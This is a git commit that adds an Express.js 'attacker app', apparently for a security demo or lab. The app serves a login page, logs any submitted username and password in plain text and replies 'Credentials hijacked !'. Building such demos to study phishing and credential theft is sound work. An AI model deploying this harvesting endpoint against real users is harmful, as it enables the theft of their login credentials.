d2275a5ee81823577f30deda89ea186d517411c7
Jakub Krkoska <kuberto773@github.com>
2023-11-21 17:31:36 +0100

    Updated folder structure + added attacker app

---
+++ attacker_app/app.js
@@ -0,0 +1,24 @@
+const express = require("express")
+const bodyParser = require("body-parser")
+const path = require('path')
+
+
+let app = express(); 
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true })); 
+
+
+app.get("/login", function (req, res) { 
+    res.sendFile(path.join(__dirname, 'public', 'login.html'));
+}); 
+
+app.post('/login', (req, res) => {
+    console.log("Username: " + req.body.username)
+    console.log("Password: " + req.body.password)
+    res.send("Credentials hijacked !");
+});
+
+var port = process.env.PORT || 3005; 
+app.listen(port, function () { 
+    console.log("Server Has Started!"); 
+}); 
